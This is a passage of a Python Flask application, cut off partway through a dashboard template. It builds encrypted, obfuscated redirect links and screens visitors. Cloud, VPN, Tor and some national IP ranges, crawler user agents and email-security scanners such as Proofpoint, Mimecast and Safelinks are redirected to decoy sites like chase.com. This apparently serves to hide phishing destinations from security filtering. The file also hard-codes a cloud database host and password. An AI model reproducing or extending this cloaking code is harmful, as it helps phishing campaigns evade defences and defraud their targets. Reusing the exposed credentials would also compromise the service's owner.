from flask import Flask, request, redirect, render_template_string, abort, url_for, session, jsonify, make_response
from flask_wtf import FlaskForm, CSRFProtect
from wtforms import StringField, SubmitField, SelectField, BooleanField, HiddenField
from wtforms.validators import DataRequired, Length, Regexp, URL
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.backends import default_backend
import os
import base64
import json
import re
import urllib.parse
import secrets
import logging
import time
import random
import math
from datetime import datetime, timedelta
import uuid
import hashlib
from valkey import Valkey
from functools import wraps
import requests
import bleach
from dotenv import load_dotenv
import ipaddress
import string
import sys

app = Flask(__name__)
load_dotenv()

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)
logger.debug("Initializing Flask app")

# Configuration values
FLASK_SECRET_KEY = os.getenv("FLASK_SECRET_KEY", "b8f9a3c2d7e4f1a9b0c3d6e8f2a7b4c9")
WTF_CSRF_SECRET_KEY = os.getenv("WTF_CSRF_SECRET_KEY", "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6")
AES_GCM_KEY = os.getenv("AES_GCM_KEY", b'\x1a\x2b\x3c\x4d\x5e\x6f\x70\x81\x92\xa3\xb4\xc5\xd6\xe7\xf8\x09\x1a\x2b\x3c\x4d\x5e\x6f\x70\x81\x92\xa3\xb4\xc5\xd6\xe7\xf8\x09')
HMAC_KEY = os.getenv("HMAC_KEY", b'\x0a\x1b\x2c\x3d\x4e\x5f\x60\x71\x82\x93\xa4\xb5\xc6\xd7\xe8\xf9\x0a\x1b\x2c\x3d\x4e\x5f\x60\x71\x82\x93\xa4\xb5\xc6\xd7\xe8\xf9')
VALKEY_HOST = os.getenv("VALKEY_HOST", "valkey-c93d570-marychamberlin31-5857.g.aivencloud.com")
VALKEY_PORT = int(os.getenv("VALKEY_PORT", 25534))
VALKEY_USERNAME = os.getenv("VALKEY_USERNAME", "default")
VALKEY_PASSWORD = os.getenv("VALKEY_PASSWORD", "AVNS_iypeRGpnvMGXCd4ayYL")
DATA_RETENTION_DAYS = 90
USER_TXT_URL = os.getenv("USER_TXT_URL", "https://raw.githubusercontent.com/anderlo091/nvclerks-flask/main/user.txt")
BLOCKLIST_URL = "https://raw.githubusercontent.com/stamparm/ipsum/master/ipsum.txt"
AWS_CIDR_URL = "https://ip-ranges.amazonaws.com/ip-ranges.json"
def get_azure_cidr_url():
    base_url = "https://download.microsoft.com/download/7/1/D/71D86715-5596-4529-9B13-DA13A5DE5B63/ServiceTags_Public_"
    date_str = datetime.now().strftime("%Y%m%d")
    return f"{base_url}{date_str}.json"
AZURE_CIDR_URL = get_azure_cidr_url()
OVH_CIDR_URL = "https://www.ovhcloud.com/en-ie/network/ip-ranges/"
GOOGLE_CIDR_URL = "https://www.gstatic.com/ipranges/cloud.json"
DIGITALOCEAN_CIDR_URL = "https://www.digitalocean.com/docs/networking/ip-ranges/"
HETZNER_CIDR_URL = "https://www.hetzner.com/en/cloud/ip-ranges"
LINODE_CIDR_URL = "https://www.linode.com/docs/guides/networking/ip-ranges/"
VULTR_CIDR_URL = "https://www.vultr.com/company/ip-ranges/"
TOR_EXIT_URL = "https://check.torproject.org/torbulkexitlist"
VPN_CIDR_URL = "https://raw.githubusercontent.com/X4BNet/lists_vpn/main/output/vpn/ipv4.txt"
LUMEN_CIDR_URL = "https://raw.githubusercontent.com/SecOps-Institute/Level3-IPs/master/level3.netset"
DATACAMP_CIDR_URL = "https://www.datacamp.com/network"  # Placeholder, may need RIPE lookup
CHINA_CIDR_URL = "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/cidr_cn.netset"
RUSSIA_CIDR_URL = "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/cidr_rf.netset"
JAPAN_CIDR_URL = "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/cidr_jp.netset"

# Anti-bot settings
SUSPICIOUS_UA_PATTERNS = [
    r'bot', r'crawler', r'spider', r'scanner', r'curl', r'wget', r'python-requests',
    r'httpclient', r'zgrab', r'masscan', r'nmap', r'probe', r'sqlmap'
]
SCANNER_UA_PATTERNS = [
    r'microsoft office', r'proofpoint', r'barracuda', r'safelink', r'zscaler', r'mimecast'
]
REQUIRED_HEADERS = ['Accept', 'Accept-Language', 'Connection', 'Accept-Encoding', 'Referer', 'DNT']
BLOCKED_CIDR_CACHE_KEY = "blocked_cidr"
SCANNER_ALLOWLIST_KEY = "scanner_allowlist"
BLOCKED_CIDR_REFRESH_INTERVAL = 86400  # 24 hours
RISK_SCORE_THRESHOLD = 75
MAX_PAYLOAD_PADDING = 32
COOKIE_TOKEN_TTL = 600  # 10 minutes
VERIFY_TOKEN_TTL = 10  # 10 seconds

# Local CIDR fallback
LOCAL_CIDR_FALLBACK = [
    ipaddress.ip_network("169.254.0.0/16"),  # Example AWS CIDR
    ipaddress.ip_network("20.0.0.0/8")       # Example malicious CIDR
]

# Verify keys at startup
try:
    if isinstance(AES_GCM_KEY, str):
        AES_GCM_KEY = AES_GCM_KEY.encode()
    if len(AES_GCM_KEY) != 32:
        raise ValueError("AES-GCM key must be 32 bytes")
    Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(secrets.token_bytes(12)), backend=default_backend())
    logger.debug("AES-GCM key validated successfully")
except Exception as e:
    logger.error(f"Invalid AES-GCM key at startup: {str(e)}")
    raise ValueError(f"AES-GCM key initialization failed: {str(e)}")

try:
    if isinstance(HMAC_KEY, str):
        HMAC_KEY = HMAC_KEY.encode()
    if len(HMAC_KEY) != 32:
        raise ValueError("HMAC key must be 32 bytes")
    h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
    h.update(b"test")
    h.finalize()
    logger.debug("HMAC key validated successfully")
except Exception as e:
    logger.error(f"Invalid HMAC key at startup: {str(e)}")
    raise ValueError(f"HMAC key initialization failed: {str(e)}")

# Flask configuration
try:
    app.config['SECRET_KEY'] = FLASK_SECRET_KEY
    app.config['WTF_CSRF_SECRET_KEY'] = WTF_CSRF_SECRET_KEY
    app.config['SESSION_COOKIE_HTTPONLY'] = True
    app.config['SESSION_COOKIE_SECURE'] = True
    app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
    app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=1)
    logger.debug("Flask configuration set successfully")
except Exception as e:
    logger.error(f"Error setting Flask config: {str(e)}", exc_info=True)
    raise

# CSRF protection
csrf = CSRFProtect(app)

# Register after_request globally
@app.after_request
def add_noise_headers(response):
    response.headers['X-Random-Token'] = secrets.token_hex(8)
    response.headers['X-Session-ID'] = generate_random_string(16)
    response.headers['Server'] = f"CustomServer/{secrets.token_hex(4)}"
    return response

# WTForms for login and URL generation
class LoginForm(FlaskForm):
    username = StringField('Username', validators=[
        DataRequired(message="Username is required"),
        Length(min=2, max=100, message="Username must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9_@.]+$', message="Username can only contain letters, numbers, _, @, or .")
    ])
    next_url = HiddenField('Next')
    submit = SubmitField('Login')

class GenerateURLForm(FlaskForm):
    subdomain = StringField('Subdomain', validators=[
        DataRequired(message="Subdomain is required"),
        Length(min=2, max=100, message="Subdomain must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9-]+$', message="Subdomain can only contain letters, numbers, or hyphens")
    ])
    randomstring1 = StringField('Randomstring1', validators=[
        DataRequired(message="Randomstring1 is required"),
        Length(min=2, max=100, message="Randomstring1 must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9_@.]+$', message="Randomstring1 can only contain letters, numbers, _, @, or .")
    ])
    destination_link = StringField('Destination Link', validators=[
        DataRequired(message="Destination link is required"),
        URL(message="Invalid URL format (must start with http:// or https://)")
    ])
    randomstring2 = StringField('Randomstring2', validators=[
        DataRequired(message="Randomstring2 is required"),
        Length(min=2, max=100, message="Randomstring2 must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9_@.]+$', message="Randomstring2 can only contain letters, numbers, _, @, or .")
    ])
    expiry = SelectField('Expiry', choices=[
        ('300', '5 Minutes'),
        ('3600', '1 Hour'),
        ('86400', '1 Day'),
        ('604800', '1 Week')
    ], default='3600')
    analytics_enabled = BooleanField('Enable Analytics')
    submit = SubmitField('Generate URL')

# Valkey initialization
valkey_client = None
try:
    valkey_client = Valkey(
        host=VALKEY_HOST,
        port=VALKEY_PORT,
        username=VALKEY_USERNAME,
        password=VALKEY_PASSWORD,
        decode_responses=True,
        ssl=True
    )
    valkey_client.ping()
    logger.debug("Valkey connection established successfully")
except Exception as e:
    logger.error(f"Valkey connection failed: {str(e)}", exc_info=True)
    valkey_client = None

# Custom Jinja2 filter for datetime
def datetime_filter(timestamp):
    try:
        return datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
    except (TypeError, ValueError) as e:
        logger.error(f"Error formatting timestamp: {str(e)}")
        return "Not Available"

app.jinja_env.filters['datetime'] = datetime_filter

# Blocklist management
def fetch_blocked_cidrs():
    blocked_cidrs = []
    try:
        # Fetch AWS CIDRs (Amazon, Amazon Technologies Inc.)
        try:
            aws_response = requests.get(AWS_CIDR_URL, timeout=5)
            aws_response.raise_for_status()
            aws_data = aws_response.json()
            for prefix in aws_data.get('prefixes', []) + aws_data.get('ipv6_prefixes', []):
                cidr = prefix.get('ip_prefix') or prefix.get('ipv6_prefix')
                if cidr:
                    blocked_cidrs.append(ipaddress.ip_network(cidr, strict=False))
        except Exception as e:
            logger.warning(f"Failed to fetch AWS CIDRs: {str(e)}")

        # Fetch Azure CIDRs (Microsoft, Microsoft Corporation)
        try:
            azure_response = requests.get(AZURE_CIDR_URL, timeout=5)
            azure_response.raise_for_status()
            azure_data = azure_response.json()
            for value in azure_data.get('values', []):
                for cidr in value.get('properties', {}).get('addressPrefixes', []):
                    blocked_cidrs.append(ipaddress.ip_network(cidr, strict=False))
        except Exception as e:
            logger.warning(f"Failed to fetch Azure CIDRs: {str(e)}")

        # Fetch OVH CIDRs
        try:
            ovh_response = requests.get(OVH_CIDR_URL, timeout=5)
            ovh_response.raise_for_status()
            for line in ovh_response.text.splitlines():
                if line.strip() and re.match(r'^\d+\.\d+\.\d+\.\d+/\d+$', line):
                    blocked_cidrs.append(ipaddress.ip_network(line.strip(), strict=False))
        except Exception as e:
            logger.warning(f"Failed to fetch OVH CIDRs: {str(e)}")

        # Fetch Google Cloud CIDRs
        try:
            google_response = requests.get(GOOGLE_CIDR_URL, timeout=5)
            google_response.raise_for_status()
            google_data = google_response.json()
            for prefix in google_data.get('prefixes', []):
                cidr = prefix.get('ipv4Prefix') or prefix.get('ipv6Prefix')
                if cidr:
                    blocked_cidrs.append(ipaddress.ip_network(cidr, strict=False))
        except Exception as e:
            logger.warning(f"Failed to fetch Google Cloud CIDRs: {str(e)}")

        # Fetch DigitalOcean, Hetzner, Linode, Vultr, VPN, Lumen, Datacamp
        for url in [DIGITALOCEAN_CIDR_URL, HETZNER_CIDR_URL, LINODE_CIDR_URL, VULTR_CIDR_URL, VPN_CIDR_URL, LUMEN_CIDR_URL]:
            try:
                response = requests.get(url, timeout=5)
                response.raise_for_status()
                for line in response.text.splitlines():
                    if line.strip() and re.match(r'^\d+\.\d+\.\d+\.\d+/\d+$|^[0-9a-f:]+/\d+$', line):
                        blocked_cidrs.append(ipaddress.ip_network(line.strip(), strict=False))
            except Exception as e:
                logger.warning(f"Failed to fetch CIDRs from {url}: {str(e)}")

        # Fetch Datacamp CIDRs (placeholder, may need RIPE lookup)
        try:
            datacamp_response = requests.get(DATACAMP_CIDR_URL, timeout=5)
            datacamp_response.raise_for_status()
            for line in datacamp_response.text.splitlines():
                if line.strip() and re.match(r'^\d+\.\d+\.\d+\.\d+/\d+$', line):
                    blocked_cidrs.append(ipaddress.ip_network(line.strip(), strict=False))
        except Exception as e:
            logger.warning(f"Failed to fetch Datacamp CIDRs: {str(e)}")

        # Fetch China, Russia, Japan CIDRs
        for url in [CHINA_CIDR_URL, RUSSIA_CIDR_URL, JAPAN_CIDR_URL]:
            try:
                response = requests.get(url, timeout=5)
                response.raise_for_status()
                for line in response.text.splitlines():
                    if line.strip() and re.match(r'^\d+\.\d+\.\d+\.\d+/\d+$|^[0-9a-f:]+/\d+$', line):
                        blocked_cidrs.append(ipaddress.ip_network(line.strip(), strict=False))
            except Exception as e:
                logger.warning(f"Failed to fetch CIDRs from {url}: {str(e)}")

        # Fetch Tor exit nodes
        try:
            tor_response = requests.get(TOR_EXIT_URL, timeout=5)
            tor_response.raise_for_status()
            for line in tor_response.text.splitlines():
                if line.strip() and re.match(r'^\d+\.\d+\.\d+\.\d+$', line):
                    blocked_cidrs.append(ipaddress.ip_network(f"{line.strip()}/32", strict=False))
        except Exception as e:
            logger.warning(f"Failed to fetch Tor exit nodes: {str(e)}")

        # Fetch malicious CIDRs
        try:
            blocklist_response = requests.get(BLOCKLIST_URL, timeout=5)
            blocklist_response.raise_for_status()
            for line in blocklist_response.text.splitlines():
                if line.strip() and not line.startswith('#'):
                    try:
                        blocked_cidrs.append(ipaddress.ip_network(line.split()[0], strict=False))
                    except ValueError:
                        continue
        except Exception as e:
            logger.warning(f"Failed to fetch malicious CIDRs: {str(e)}")

        if blocked_cidrs and valkey_client:
            valkey_client.setex(BLOCKED_CIDR_CACHE_KEY, BLOCKED_CIDR_REFRESH_INTERVAL, json.dumps([str(cidr) for cidr in blocked_cidrs]))
        logger.debug(f"Fetched {len(blocked_cidrs)} blocked CIDRs")
        return blocked_cidrs if blocked_cidrs else LOCAL_CIDR_FALLBACK
    except Exception as e:
        logger.error(f"Error fetching blocked CIDRs: {str(e)}")
        if valkey_client:
            cached = valkey_client.get(BLOCKED_CIDR_CACHE_KEY)
            if cached:
                return [ipaddress.ip_network(cidr) for cidr in json.loads(cached)]
        return LOCAL_CIDR_FALLBACK

# Scanner allowlist management
def update_scanner_allowlist():
    try:
        scanner_ips = [
            "13.107.6.0/24",  # Example Microsoft 365 range
            "8.8.8.8/32"      # Example Google range
            # Add Barracuda, Proofpoint, Safelink ranges from logs
        ]
        if valkey_client:
            valkey_client.delete(SCANNER_ALLOWLIST_KEY)
            for ip in scanner_ips:
                valkey_client.sadd(SCANNER_ALLOWLIST_KEY, ip)
            valkey_client.expire(SCANNER_ALLOWLIST_KEY, BLOCKED_CIDR_REFRESH_INTERVAL)
        logger.debug("Updated scanner allowlist")
    except Exception as e:
        logger.warning(f"Failed to update scanner allowlist: {str(e)}")

# Anti-bot utilities
def calculate_request_entropy(headers, query_params):
    entropy = 0
    for value in list(headers.values()) + list(query_params.values()):
        if value:
            freq = {}
            for char in value:
                freq[char] = freq.get(char, 0) + 1
            for count in freq.values():
                prob = count / len(value)
                entropy -= prob * math.log2(prob) if prob > 0 else 0
    return entropy

def generate_request_fingerprint():
    headers = {k: v for k, v in request.headers.items() if k in REQUIRED_HEADERS}
    timing = str(int(time.time() * 1000) % 10000)
    return hashlib.sha256(f"{json.dumps(headers, sort_keys=True)}{timing}".encode()).hexdigest()

def is_suspicious_request():
    risk_score = 0
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '').lower()
    headers = request.headers
    query_params = request.args

    # Check blocked CIDRs
    if valkey_client:
        cached_cidrs = valkey_client.get(BLOCKED_CIDR_CACHE_KEY)
        if cached_cidrs:
            blocked_cidrs = [ipaddress.ip_network(cidr) for cidr in json.loads(cached_cidrs)]
        else:
            blocked_cidrs = fetch_blocked_cidrs()
    else:
        blocked_cidrs = LOCAL_CIDR_FALLBACK

    try:
        ip_addr = ipaddress.ip_address(ip)
        if any(ip_addr in cidr for cidr in blocked_cidrs):
            logger.debug(f"IP {ip} in blocked CIDR (cloud/VPN/Tor/ISP/country)")
            return redirect("https://www.chase.com", code=302)
    except ValueError:
        logger.warning(f"Invalid IP address: {ip}")
        risk_score += 20

    # Check scanner allowlist
    is_scanner = False
    if valkey_client:
        scanner_ips = valkey_client.smembers(SCANNER_ALLOWLIST_KEY) or []
        try:
            ip_addr = ipaddress.ip_address(ip)
            if any(ip_addr in ipaddress.ip_network(cidr, strict=False) for cidr in scanner_ips):
                logger.debug(f"IP {ip} in scanner allowlist")
                is_scanner = True
        except ValueError:
            pass

    # User-Agent analysis
    if any(re.search(pattern, ua, re.IGNORECASE) for pattern in SUSPICIOUS_UA_PATTERNS):
        risk_score += 30
        logger.debug(f"Suspicious User-Agent: {ua}")
    if any(re.search(pattern, ua, re.IGNORECASE) for pattern in SCANNER_UA_PATTERNS):
        is_scanner = True
        logger.debug(f"Scanner User-Agent: {ua}")

    # Header validation
    missing_headers = [h for h in REQUIRED_HEADERS if h not in headers]
    if missing_headers:
        risk_score += 20
        logger.debug(f"Missing headers: {missing_headers}")

    # Entropy analysis
    entropy = calculate_request_entropy(headers, query_params)
    if entropy < 5:
        risk_score += 25
        logger.debug(f"Low request entropy: {entropy}")

    # Behavioral analysis (only for high-risk IPs)
    if valkey_client and risk_score >= 50:
        request_key = f"requests:{ip}:link"
        valkey_client.lpush(request_key, str(time.time()))
        valkey_client.ltrim(request_key, 0, 9)  # Keep last 10 requests
        valkey_client.expire(request_key, 20)
        recent_requests = valkey_client.lrange(request_key, 0, -1)
        if len(recent_requests) > 2:
            timestamps = [float(t) for t in recent_requests]
            if max(timestamps) - min(timestamps) < 20:
                risk_score += 50
                logger.debug(f"Rapid link access from IP: {ip}")

    # Fingerprint analysis
    fingerprint = generate_request_fingerprint()
    if valkey_client:
        fingerprint_key = f"fingerprint:{fingerprint}"
        valkey_client.sadd(fingerprint_key, ip)
        valkey_client.expire(fingerprint_key, 3600)
        if valkey_client.scard(fingerprint_key) > 5:
            risk_score += 50
            logger.debug(f"Repeated fingerprint from IP: {ip}")

    # Store risk score
    if valkey_client:
        try:
            valkey_client.hincrby(f"risk_score:{ip}", "score", risk_score)
            valkey_client.expire(f"risk_score:{ip}", 3600)
        except Exception as e:
            logger.warning(f"Failed to store risk score for IP {ip}: {str(e)}")

    if risk_score >= RISK_SCORE_THRESHOLD:
        logger.warning(f"Blocked suspicious request from {ip}: risk_score={risk_score}")
        return redirect("https://www.chase.com", code=302)

    if is_scanner:
        logger.debug(f"Scanner detected for IP {ip}")
        return redirect("https://www.web3.com", code=302)

    return None

# Dynamic rate limiting
def dynamic_rate_limit(base_limit=5, base_per=60):
    def decorator(f):
        @wraps(f)
        def wrapped_function(*args, **kwargs):
            if not valkey_client:
                logger.warning("Valkey unavailable, skipping rate limit")
                return f(*args, **kwargs)
            ip = request.remote_addr
            risk_score = int(valkey_client.hget(f"risk_score:{ip}", "score") or 0)
            limit = max(1, base_limit - (risk_score // 20))
            per = random.randint(base_per - 10, base_per + 10)
            key = f"rate_limit:{ip}:{f.__name__}:{secrets.token_hex(4)}"
            try:
                current = valkey_client.get(key)
                if current is None:
                    valkey_client.setex(key, per, 1)
                    logger.debug(f"Rate limit set for {ip}: 1/{limit}")
                elif int(current) >= limit:
                    logger.warning(f"Rate limit exceeded for IP: {ip}, risk_score: {risk_score}")
                    return redirect("https://www.chase.com", code=302)
                else:
                    valkey_client.incr(key)
                    logger.debug(f"Rate limit incremented for {ip}: {int(current)+1}/{limit}")
                return f(*args, **kwargs)
            except Exception as e:
                logger.error(f"Error in rate_limit for IP {ip}: {str(e)}")
                return f(*args, **kwargs)
        return wrapped_function
    return decorator

# Payload encryption and obfuscation
def encrypt_payload(payload):
    try:
        payload_bytes = json.dumps({
            "data": payload,
            "decoy": secrets.token_hex(16),
            "timestamp": int(time.time())
        }).encode('utf-8')
        padding_length = random.randint(8, MAX_PAYLOAD_PADDING)
        padding = secrets.token_bytes(padding_length)
        padded_payload = len(padding).to_bytes(4, 'big') + payload_bytes + padding
        b64_payload = base64.urlsafe_b64encode(padded_payload)
        iv = secrets.token_bytes(12)
        cipher = Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(b64_payload) + encryptor.finalize()
        encrypted = iv + ciphertext + encryptor.tag
        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
        h.update(encrypted)
        signature = h.finalize()
        result = f"{base64.urlsafe_b64encode(encrypted).decode()}.{base64.urlsafe_b64encode(signature).decode()}"
        logger.debug(f"Encrypted payload: {result[:20]}...")
        return result
    except Exception as e:
        logger.error(f"Payload encryption error: {str(e)}", exc_info=True)
        raise ValueError(f"Encryption failed: {str(e)}")

def decrypt_payload(encrypted):
    try:
        parts = encrypted.split('.')
        if len(parts) != 2:
            raise ValueError("Invalid payload format")
        encrypted_data = base64.urlsafe_b64decode(parts[0])
        signature = base64.urlsafe_b64decode(parts[1])
        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
        h.update(encrypted_data)
        h.verify(signature)
        iv = encrypted_data[:12]
        tag = encrypted_data[-16:]
        ciphertext = encrypted_data[12:-16]
        cipher = Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        b64_payload = decryptor.update(ciphertext) + decryptor.finalize()
        padded_payload = base64.urlsafe_b64decode(b64_payload)
        if len(padded_payload) < 4:
            raise ValueError("Invalid payload: too short")
        padding_length = int.from_bytes(padded_payload[:4], 'big')
        if padding_length > MAX_PAYLOAD_PADDING or len(padded_payload) < 4 + padding_length:
            raise ValueError("Invalid padding length")
        payload_bytes = padded_payload[4:-padding_length]
        payload_json = json.loads(payload_bytes.decode('utf-8'))
        result = payload_json['data']
        logger.debug(f"Decrypted payload: {result[:50]}...")
        return result
    except Exception as e:
        logger.error(f"Payload decryption error: {str(e)}", exc_info=True)
        raise ValueError(f"Decryption failed: {str(e)}")

# URL generation utilities
def generate_random_string(length):
    characters = string.ascii_letters + string.digits + '-_'
    return ''.join(secrets.choice(characters) for _ in range(length))

def get_valid_usernames():
    try:
        if valkey_client:
            cached = valkey_client.get("usernames")
            if cached:
                logger.debug("Retrieved usernames from Valkey cache")
                return json.loads(cached)
        response = requests.get(USER_TXT_URL, timeout=5)
        response.raise_for_status()
        usernames = [bleach.clean(line.strip()) for line in response.text.splitlines() if line.strip()]
        if valkey_client:
            valkey_client.setex("usernames", 3600, json.dumps(usernames))
            logger.debug("Cached usernames in Valkey")
        logger.debug(f"Fetched {len(usernames)} usernames")
        return usernames
    except Exception as e:
        logger.error(f"Error fetching usernames: {str(e)}")
        return []

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'username' not in session:
            logger.debug(f"Redirecting to login from {request.url}")
            return redirect(url_for('login', next=request.url))
        logger.debug(f"Authenticated user: {session['username']}")
        return f(*args, **kwargs)
    return decorated_function

def get_base_domain():
    try:
        host = request.host
        parts = host.split('.')
        return '.'.join(parts[-2:]) if len(parts) >= 2 else host
    except Exception as e:
        logger.error(f"Error getting base domain: {str(e)}")
        return "tamarisksd.com"

@app.before_request
def block_suspicious_requests():
    try:
        result = is_suspicious_request()
        if result:
            return result
    except Exception as e:
        logger.error(f"Error in block_suspicious_requests: {str(e)}", exc_info=True)
        return redirect("https://www.chase.com", code=302)

@app.route("/login", methods=["GET", "POST"])
@dynamic_rate_limit(base_limit=5, base_per=60)
def login():
    try:
        logger.debug(f"Accessing /login, method: {request.method}, next: {request.args.get('next', '')}")
        form = LoginForm()
        if form.validate_on_submit():
            username = bleach.clean(form.username.data.strip())
            logger.debug(f"Login attempt with username: {username}")
            valid_usernames = get_valid_usernames()
            if username in valid_usernames:
                session['username'] = username
                session.permanent = True
                session.modified = True
                logger.debug(f"User {username} logged in")
                next_url = form.next_url.data or url_for('dashboard')
                return redirect(next_url)
            logger.warning(f"Invalid login attempt: {username}")
            form.username.errors.append("Invalid username")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <title>Login</title>
                <script src="https://cdn.tailwindcss.com"></script>
                <style>
                    body { background: linear-gradient(to bottom, #252423, #6264a7); color: #ffffff; }
                </style>
            </head>
            <body class="min-h-screen flex items-center justify-center p-4">
                <div class="w-full text-center">
                    <h1 class="text-3xl font-extrabold mb-6 text-white">Login</h1>
                    {% if form.errors %}
                        <p class="text-red-400 mb-4">
                            {% for field, errors in form.errors.items() %}
                                {% for error in errors %}
                                    {{ error }}<br>
                                {% endfor %}
                            {% endfor %}
                        </p>
                    {% endif %}
                    <form method="POST" class="space-y-5 max-w-md mx-auto">
                        {{ form.csrf_token }}
                        {{ form.next_url(value=request.args.get('next', '')) }}
                        <div>
                            <label class="block text-sm font-medium text-white">Username</label>
                            {{ form.username(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
                        </div>
                        {{ form.submit(class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition") }}
                    </form>
                </div>
            </body>
            </html
        """, form=form)
    except Exception as e:
        logger.error(f"Error in login: {str(e)}", exc_info=True)
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Internal Server Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong. Please try again later or check server logs.</p>
                </div>
            </body>
            </html
        """), 500

@app.route("/", methods=["GET"])
@dynamic_rate_limit(base_limit=5, base_per=60)
def index():
    try:
        logger.debug(f"Accessing root URL, host: {request.host}")
        if 'username' in session:
            return redirect(url_for('dashboard'))
        return redirect(url_for('login'))
    except Exception as e:
        logger.error(f"Error in index: {str(e)}", exc_info=True)
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Internal Server Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong. Please try again later or check server logs.</p>
                </div>
            </body>
            </html
        """), 500

@app.route("/dashboard", methods=["GET", "POST"])
@login_required
@dynamic_rate_limit(base_limit=5, base_per=60)
def dashboard():
    try:
        username = session['username']
        logger.debug(f"Accessing dashboard for user: {username}")
        base_domain = get_base_domain()
        form = GenerateURLForm()
        error = None

        if form.validate_on_submit():
            subdomain = bleach.clean(form.subdomain.data.strip())
            randomstring1 = bleach.clean(form.randomstring1.data.strip())
            destination_link = bleach.clean(form.destination_link.data.strip())
            randomstring2 = bleach.clean(form.randomstring2.data.strip())
            analytics_enabled = form.analytics_enabled.data
            expiry = int(form.expiry.data)

            parsed_url = urllib.parse.urlparse(destination_link)
            if not parsed_url.scheme in ('http', 'https') or not parsed_url.netloc:
                error = "Invalid URL: Must be a valid http:// or https:// URL"
                logger.warning(f"Invalid destination_link: {destination_link}")

            if not error:
                path_segment = f"{randomstring1}{randomstring2}/{uuid.uuid4()}{secrets.token_hex(10)}"
                endpoint = generate_random_string(16)
                expiry_timestamp = int(time.time()) + expiry
                payload = json.dumps({
                    "student_link": destination_link,
                    "timestamp": int(time.time() * 1000),
                    "expiry": expiry_timestamp,
                    "fingerprint": generate_request_fingerprint()
                })

                try:
                    encrypted_payload = encrypt_payload(payload)
                except ValueError as e:
                    logger.error(f"Encryption failed: {str(e)}")
                    error = "Failed to encrypt payload"

                if not error:
                    fake_params = f"?utm_source={generate_random_string(8)}&session={secrets.token_hex(6)}"
                    generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}{fake_params}"
                    url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
                    if valkey_client:
                        valkey_client.hset(f"user:{username}:url:{url_id}", mapping={
                            "url": generated_url,
                            "destination": destination_link,
                            "encrypted_payload": encrypted_payload,
                            "endpoint": endpoint,
                            "created": int(time.time()),
                            "expiry": expiry_timestamp,
                            "clicks": 0,
                            "analytics_enabled": "1" if analytics_enabled else "0"
                        })
                        valkey_client.expire(f"user:{username}:url:{url_id}", DATA_RETENTION_DAYS * 86400)
                        logger.info(f"Generated URL for {username}: {generated_url}")
                        return redirect(url_for('dashboard'))
                    else:
                        error = "Database unavailable"

        urls = []
        valkey_error = None
        if valkey_client:
            try:
                url_keys = valkey_client.keys(f"user:{username}:url:*")
                for key in url_keys:
                    url_data = valkey_client.hgetall(key)
                    if not url_data:
                        continue
                    url_id = key.split(':')[-1]
                    urls.append({
                        "url": url_data.get('url', ''),
                        "destination": url_data.get('destination', ''),
                        "created": datetime.fromtimestamp(int(url_data.get('created', 0))).strftime('%Y-%m-%d %H:%M:%S'),
                        "expiry": datetime.fromtimestamp(int(url_data.get('expiry', 0))).strftime('%Y-%m-%d %H:%M:%S'),
                        "clicks": int(url_data.get('clicks', 0)),
                        "analytics_enabled": url_data.get('analytics_enabled', '0') == '1',
                        "url_id": url_id
                    })
            except Exception as e:
                logger.error(f"Valkey error fetching URLs: {str(e)}")
                valkey_error = "Unable to fetch URL history"

        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
